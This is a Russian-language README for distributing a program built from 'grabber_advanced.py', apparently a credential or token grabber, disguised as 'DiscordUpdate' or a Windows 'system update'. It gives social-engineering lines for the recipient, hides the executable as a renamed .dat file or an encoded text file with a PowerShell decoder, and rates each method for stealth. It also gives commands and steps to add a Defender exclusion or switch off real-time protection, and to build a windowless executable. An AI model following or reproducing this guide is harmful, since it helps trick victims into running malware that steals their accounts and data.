# 📦 Инструкция по передаче файлов

## ❌ Проблема
При передаче `.exe` файлов через мессенджеры (Discord, Telegram, WhatsApp) они могут:
- Блокироваться автоматически
- Переименовываться
- Удаляться антивирусом

## ✅ Решение - Используйте упакованные версии

### 📁 Доступные варианты в папке `dist/`:

---

## 🟢 ВАРИАНТ 1: DiscordUpdate.zip (РЕКОМЕНДУЕТСЯ)

**Для отправителя:**
1. Отправьте файл `DiscordUpdate.zip` любым способом
2. ZIP архивы обычно не блокируются

**Для получателя:**
1. Скачайте `DiscordUpdate.zip`
2. Распакуйте архив (ПКМ → Извлечь всё)
3. Запустите `DiscordUpdate.exe`

---

## 🟡 ВАРИАНТ 2: WindowsUpdate.zip (ЗАМАСКИРОВАННЫЙ)

**Для отправителя:**
1. Отправьте `WindowsUpdate.zip`
2. Сообщите получателю, что это "системное обновление"

**Для получателя:**
1. Скачайте `WindowsUpdate.zip`
2. Распакуйте архив
3. Найдите файл `system_update.dat`
4. Переименуйте его в `system_update.exe`
5. Запустите `system_update.exe`

---

## 🔵 ВАРИАНТ 3: DiscordUpdate_encoded.txt (ТЕКСТОВЫЙ)

**Для отправителя:**
1. Отправьте 2 файла:
   - `DiscordUpdate_encoded.txt`
   - `decoder.ps1`
2. Можно отправить как обычные текстовые файлы

**Для получателя:**
1. Скачайте оба файла в одну папку
2. Откройте PowerShell в этой папке (Shift + ПКМ → "Открыть PowerShell здесь")
3. Выполните команду:
   ```powershell
   .\decoder.ps1
   ```
4. Появится файл `DiscordUpdate.exe`
5. Запустите его

---

## 🛡️ Обход антивируса

Если Windows Defender блокирует файл:

### Способ 1: Добавить в исключения
```powershell
# Запустите PowerShell от администратора
Add-MpPreference -ExclusionPath "C:\Путь\К\Папке\DiscordUpdate.exe"
```

### Способ 2: Временно отключить защиту
1. Параметры Windows → Обновление и безопасность
2. Безопасность Windows → Защита от вирусов
3. Управление настройками → Отключить "Защита в реальном времени"
4. Запустите файл
5. Включите защиту обратно

---

## 📊 Сравнение методов

| Метод           | Размер | Простота | Скрытность |
| --------------- | ------ | -------- | ---------- |
| Вариант 1 (ZIP) | 12 МБ  | ⭐⭐⭐      | ⭐⭐         |
| Вариант 2 (DAT) | 12 МБ  | ⭐⭐       | ⭐⭐⭐        |
| Вариант 3 (TXT) | 17 МБ  | ⭐        | ⭐⭐⭐⭐⭐      |

---

## 🚀 Альтернативные способы передачи

### 1. Облачное хранилище
- Google Drive: https://drive.google.com
- MEGA: https://mega.nz (шифрование)
- Yandex.Disk: https://disk.yandex.ru

### 2. Файлообменники
- WeTransfer: https://wetransfer.com
- Firefox Send: https://send.vis.ee
- Anonfiles: https://anonfiles.com

### 3. Локальная сеть
```powershell
# На компьютере отправителя создайте общий доступ:
# ПКМ на папке dist → Свойства → Доступ → Расширенная настройка → Открыть общий доступ

# На компьютере получателя:
# Откройте проводник → Сеть → Найдите компьютер отправителя
```

---

## ⚠️ Важно

- После получения файла запускайте его только если доверяете отправителю
- Антивирусы будут блокировать из-за природы программы (это нормально)
- Файл работает только на Windows

---

## 🆘 Если ничего не помогло

### Последний способ - пересборка на месте:
1. Отправьте исходный код: `grabber_advanced.py`
2. Получатель установит Python и зависимости:
   ```powershell
   pip install pywin32 pycryptodome pyinstaller
   ```
3. Соберёт exe сам:
   ```powershell
   pyinstaller --onefile --noconsole --name "DiscordUpdate" grabber_advanced.py
   ```

---

**Создано**: 3 ноября 2025  
**Рекомендация**: Используйте Вариант 1 (ZIP) для простоты или Вариант 3 (TXT) для максимальной скрытности
